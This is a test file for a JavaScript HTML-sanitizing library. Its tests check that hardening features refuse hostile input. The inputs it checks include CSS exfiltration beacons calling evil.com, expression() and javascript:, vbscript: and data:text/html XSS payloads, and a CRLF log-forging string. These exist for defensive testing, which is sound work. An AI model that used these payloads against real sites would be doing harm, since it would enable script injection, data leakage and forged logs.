// 0harden2-test.cjs — tests for the v1.2.0 hardening additions.
//   I5  inline-style CSS-injection sanitizer (url()-exfil, expression(), @import…)
//   I6  single-attribute value length cap
//   I3e URL backslash-fold (kills backslash-disguised protocol-relative hosts)
//   J8  immutable tag allowlist + frozen API surface
// Zero-dep, in-file DOM shim (same shape as the other suites). Run: node 0harden2-test.cjs
'use strict';

// ── DOM shim ───────────────────────────────────────────────────
class Node {
  constructor() { this.childNodes = []; this.nodeType = 1; }
  appendChild(c) {
    if (c instanceof DocumentFragment) { for (const k of c.childNodes.slice()) this.appendChild(k); return c; }
    c.parentNode = this; this.childNodes.push(c); return c;
  }
  get textContent() { return this.childNodes.map(c => c.textContent ?? '').join(''); }
  set textContent(v) { this.childNodes = []; if (v !== '') this.appendChild(new TextNode(String(v))); }
}
class TextNode { constructor(d) { this.data = String(d); this.nodeType = 3; } get textContent() { return this.data; } }
class Element extends Node {
  constructor(tag) { super(); this.tagName = String(tag).toLowerCase(); this._attrs = {}; this.dataset = {}; }
  setAttribute(k, v) {
    this._attrs[k] = String(v);
    if (k.startsWith('data-')) { const c = k.slice(5).replace(/-([a-z])/g, (_, x) => x.toUpperCase()); this.dataset[c] = String(v); }
    if (k.toLowerCase().startsWith('on')) this._hadInlineHandler = true;
  }
  getAttribute(k) { return this._attrs[k]; }
  hasAttribute(k) { return Object.prototype.hasOwnProperty.call(this._attrs, k); }
  set id(v) { this._attrs.id = v; } get id() { return this._attrs.id; }
  set className(v) { this._attrs.class = v; } get className() { return this._attrs.class || ''; }
  addEventListener() {}
}
class Template extends Element {
  constructor() { super('template'); this.content = new DocumentFragment(); }
  set innerHTML(html) {
    if (/<script[\s>]/i.test(html)) { const s = new Element('script'); s.appendChild(new TextNode(html)); this.content.appendChild(s); }
    else { const h = new Element('span'); h.appendChild(new TextNode('[[RAWHTML]]')); this.content.appendChild(h); }
  }
}
class DocumentFragment extends Node { constructor() { super(); this.nodeType = 11; } }
const document = {
  createElement: (t) => t === 'template' ? new Template() : new Element(t),
  createTextNode: (d) => new TextNode(d),
  createDocumentFragment: () => new DocumentFragment(),
  body: new Element('body'), addEventListener: () => {},
};
global.document = document; global.Node = Node;
global.window = { addEventListener: () => {} };

const fs = require('fs'), os = require('os'), pathm = require('path');
const toCjs = (name) => { const p = pathm.join(os.tmpdir(), `h2-${name}-${process.pid}.cjs`); fs.writeFileSync(p, fs.readFileSync(pathm.join(__dirname, `${name}.js`), 'utf8')); return p; };
global.OUI_BIND = require(toCjs('0bind'));
const html0 = require(toCjs('0html'));
const bind = global.OUI_BIND;

let pass = 0, fail = 0;
const ok = (n, c) => { const g = !!c; console.log(`${g ? '✓' : '✗ FAIL'} ${n}`); g ? pass++ : fail++; };
const styleOf = (node) => node._attrs.style;

// ═══════════════════════════════════════════════════════════════
console.log('\n── I5: inline-style sanitizer — DANGEROUS styles refused ──');
{
  const bad = [
    ['expression()',            'width:expression(alert(1))'],
    ['url(javascript:)',        'color:red;background:url(javascript:alert(1))'],
    ['-moz-binding',            '-moz-binding:url(http://x/e.xml#e)'],
    ['behavior:',               'behavior:url(#default#time2)'],
    ['@import',                 "@import url('//evil.com/e.css')"],
    ['url(//off-origin beacon)','background:url(//evil.com/beacon?leak=1)'],
    ['url(https external)',     'background:url(https://evil.com/beacon)'],
    ['url(/\\backslash host)',  'background:url(/\\evil.com/beacon)'],   // I3e-dependent
    ['comment-split expr',      'width:expr/**/ession(alert(1))'],
    ['url(data:svg)',           'background:url(data:image/svg+xml;base64,PHN2Zz4=)'],
    ['over-length',             'x:' + 'a'.repeat(5000)],
  ];
  let allNull = true;
  for (const [name, s] of bad) {
    if (bind.sanitizeStyle(s) !== null) { allNull = false; console.log('    LEAK (kept):', name); }
  }
  ok('every dangerous style returns null (refused)', allNull);
}

console.log('\n── I5: inline-style sanitizer — SAFE styles preserved ──');
{
  const good = [
    'color:red;font-weight:bold',
    'background:url(/img/bg.png)',
    'background:url(bg.png)',
    'background:url(#grad)',
    'background:url(data:image/png;base64,iVBORw0KGgo=)',
    'background-image:url("assets/x.webp")',
    'display:grid;gap:8px;padding:1rem',
  ];
  let allKept = true;
  for (const s of good) {
    if (bind.sanitizeStyle(s) !== s) { allKept = false; console.log('    false-drop:', s); }
  }
  ok('every benign style is preserved unchanged', allKept);
}

console.log('\n── I5: end-to-end through the compiler ──');
{
  const evil = html0.compile({ tag: 'div', attrs: { style: 'background:url(//evil.com/x)' } });
  ok('compiler drops the unsafe style attribute', styleOf(evil) === undefined);
  const okDiv = html0.compile({ tag: 'div', attrs: { style: 'color:blue' } });
  ok('compiler keeps a benign style attribute', styleOf(okDiv) === 'color:blue');
}

console.log('\n── I6: single-attribute value length cap ──');
{
  const huge = html0.compile({ tag: 'div', attrs: { title: 'x'.repeat(600 * 1024) } });
  ok('over-long attribute value dropped', huge._attrs.title === undefined);
  const small = html0.compile({ tag: 'div', attrs: { title: 'fine' } });
  ok('normal attribute value kept', small._attrs.title === 'fine');
}

console.log('\n── I3e: backslash-fold in the URL gates ──');
{
  ok('href gate folds \\ consistently (/\\host == //host)',
     bind.isSafeUrl('/\\evil.com') === bind.isSafeUrl('//evil.com'));
  ok('CSS gate blocks backslash-disguised protocol-relative', bind.isCssUrlSafe('/\\evil.com/x') === false);
  ok('CSS gate blocks plain protocol-relative', bind.isCssUrlSafe('//evil.com/x') === false);
  ok('CSS gate allows same-origin relative', bind.isCssUrlSafe('/img/x.png') === true);
  ok('CSS gate allows safe data:image', bind.isCssUrlSafe('data:image/png;base64,iVBOR') === true);
  ok('CSS gate blocks data:svg', bind.isCssUrlSafe('data:image/svg+xml,<svg>') === false);
  ok('CSS gate blocks external https (silent-load exfil)', bind.isCssUrlSafe('https://cdn.example/x.png') === false);
}

console.log('\n── J8: immutable allowlist + frozen API ──');
{
  ok('html0 API object is frozen', Object.isFrozen(html0) === true);
  ok('bind API object is frozen', Object.isFrozen(bind) === true);
  ok('ALLOWED_TAGS export is a frozen array', Array.isArray(html0.ALLOWED_TAGS) && Object.isFrozen(html0.ALLOWED_TAGS));
  ok('FORBIDDEN_KEYS export is a frozen array', Array.isArray(html0.FORBIDDEN_KEYS) && Object.isFrozen(html0.FORBIDDEN_KEYS));

  // The OLD attack: html0.ALLOWED_TAGS.add('script'). The export is now a frozen
  // copy with no .add; mutating it must not touch the internal enforcement set.
  let mutBlocked = false;
  try { html0.ALLOWED_TAGS.push('script'); } catch (_) { mutBlocked = true; }
  ok('mutating the ALLOWED_TAGS snapshot throws (frozen)', mutBlocked);
  const stillRefused = html0.compile({ tag: 'script' });
  ok('script STILL refused after tamper attempt (inert span)',
     stillRefused.tagName === 'span' && stillRefused._attrs['data-0html-refused'] === 'script');

  // Method swap must not stick.
  const realCompile = html0.compile;
  let swapBlocked = false;
  try { html0.compile = () => 'pwned'; } catch (_) { swapBlocked = true; }
  ok('overwriting a method throws (frozen)', swapBlocked);
  ok('method reference unchanged after swap attempt', html0.compile === realCompile);

  let bindSwapBlocked = false;
  try { bind.el = null; } catch (_) { bindSwapBlocked = true; }
  ok('overwriting bind.el throws (frozen)', bindSwapBlocked && typeof bind.el === 'function');

  ok('isAllowedTag: div → true', html0.isAllowedTag('div') === true);
  ok('isAllowedTag: script → false', html0.isAllowedTag('script') === false);
  ok('isAllowedTag: SCRIPT (case) → false', html0.isAllowedTag('SCRIPT') === false);
}

// ═══════════════════════════════════════════════════════════════
console.log('\n── URL-coverage guard: every URL attr on every allowed tag is gated ──');
{
  // (tag, urlAttr) pairs for the real URL-bearing attributes across the tag
  // allowlist. If a future allowlist change adds a tag with a new URL attribute
  // — or drops one from URL_ATTRS — this matrix fails and the hole is caught.
  const PAIRS = [
    ['a', 'href'], ['a', 'ping'],
    ['img', 'src'], ['img', 'srcset'], ['img', 'longdesc'],
    ['source', 'src'], ['source', 'srcset'],
    ['video', 'src'], ['video', 'poster'],
    ['audio', 'src'], ['track', 'src'],
    ['input', 'src'], ['input', 'formaction'],   // type=image src, submit formaction
    ['button', 'formaction'], ['form', 'action'],
    ['blockquote', 'cite'], ['q', 'cite'],
    ['use', 'href'], ['use', 'xlink:href'],
  ];
  const PAYLOADS = ['javascript:alert(1)', 'JavaScript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'vbscript:msgbox(1)'];
  let leaks = [];
  for (const [tag, attr] of PAIRS) {
    for (const p of PAYLOADS) {
      const n = html0.compile({ tag, attrs: { [attr]: p } });
      // gated → attribute absent. (use href also requires #frag, so it's absent too.)
      if (n._attrs[attr] !== undefined) leaks.push(`${tag}[${attr}]="${p}"`);
    }
  }
  ok(`all ${PAIRS.length * PAYLOADS.length} tag/attr/payload combos dropped`, leaks.length === 0);
  if (leaks.length) leaks.slice(0, 8).forEach(l => console.log('    LEAK:', l));

  // Positive control: a legitimate relative href on <a> IS kept (guards against
  // the matrix passing simply because the compiler drops everything).
  const good = html0.compile({ tag: 'a', attrs: { href: '/docs/page' } });
  ok('positive control: benign relative href kept', good._attrs.href === '/docs/page');
}

console.log('\n── J9: fromJSON raw-input byte cap ──');
{
  const bigButValid = JSON.stringify({ tag: 'div', text: 'x'.repeat(2000) });
  let okThrew = false;
  try { html0.fromJSON(bigButValid, { maxInputBytes: 500 }); } catch (e) { okThrew = e instanceof RangeError; }
  ok('input over maxInputBytes throws RangeError', okThrew);

  const small = html0.fromJSON(JSON.stringify({ tag: 'p', text: 'hi' }), { maxInputBytes: 500 });
  ok('input under the cap compiles normally', small.tagName === 'p' && small.textContent === 'hi');

  // byte-accurate: a multi-byte char must be counted by bytes, not chars.
  const multibyte = JSON.stringify({ tag: 'div', text: '😀'.repeat(200) }); // 4 bytes each
  let mbThrew = false;
  try { html0.fromJSON(multibyte, { maxInputBytes: 300 }); } catch (e) { mbThrew = e instanceof RangeError; }
  ok('multi-byte payload measured in bytes (not undercounted)', mbThrew);
}

console.log('\n── J10: per-node attribute-count cap ──');
{
  const attrs = {};
  for (let i = 0; i < 5000; i++) attrs['data-x' + i] = '1';
  const n = html0.compile({ tag: 'div', attrs }, { maxAttrs: 32 });
  const count = Object.keys(n._attrs).length;
  ok('attribute count capped at maxAttrs', count <= 32);

  // handlers count toward the same ceiling.
  const on = {};
  for (let i = 0; i < 500; i++) on['click' + i] = 'h';
  const n2 = html0.compile({ tag: 'div', on }, { maxAttrs: 16 });
  ok('handlers also bounded by maxAttrs', Object.keys(n2._attrs).length <= 16);

  // default is generous — a normal node with a handful of attrs is untouched.
  const normal = html0.compile({ tag: 'input', attrs: { type: 'text', name: 'q', placeholder: 'search', 'aria-label': 'search' } });
  ok('normal small attribute set unaffected by default cap',
     normal._attrs.type === 'text' && normal._attrs.name === 'q' && normal._attrs['aria-label'] === 'search');
}

console.log('\n── I7: log-injection guard (CWE-117) in warning messages ──');
{
  // logSafe() unit behavior
  ok('logSafe strips CR/LF to a placeholder', !/[\r\n]/.test(bind.logSafe('a\r\nb')));
  ok('logSafe strips other control chars', !/[\u0000\u0007\u001b]/.test(bind.logSafe('a\u0000\u0007\u001b')));
  ok('logSafe caps length', bind.logSafe('z'.repeat(500)).length <= 121);
  ok('logSafe leaves benign text intact', bind.logSafe('href=/docs/x') === 'href=/docs/x');

  // End-to-end: a forged-log-line payload must not produce a second line.
  const cap = [];
  const orig = console.warn; console.warn = (m) => cap.push(String(m));
  try {
    // rejected URL carrying CRLF + a fake CRITICAL entry
    bind.el('a', { href: 'javascript:x\n2026 [CRITICAL] auth.bypass admin' });
    // rejected tag carrying CRLF (compiler path, via _bind.logSafe)
    html0.compile({ tag: 'script\n[CRITICAL] injected', text: 'x' });
    // rejected attr name carrying CRLF
    html0.compile({ tag: 'div', attrs: { 'bad\nname': 'v' } });
  } finally { console.warn = orig; }

  const allText = cap.join('\n');
  // The only newlines in the captured output should be the join()s we added —
  // i.e. exactly one line per warn call, none injected by the payloads.
  const injectedLines = cap.filter(m => /[\r\n]/.test(m));
  ok('no warning contains an attacker newline', injectedLines.length === 0);
  ok('forged "[CRITICAL] auth.bypass" did not become its own line',
     !cap.some(m => /^2026 \[CRITICAL\]/.test(m)));
  ok('warnings were still emitted (guard did not silence them)', cap.length >= 3);
}

console.log(`\n────────────────────────────────────────`);
console.log(`  ${pass} passed, ${fail} failed  (v1.2.0–1.3.1 hardening)`);
console.log(`────────────────────────────────────────`);
process.exit(fail ? 1 : 0);
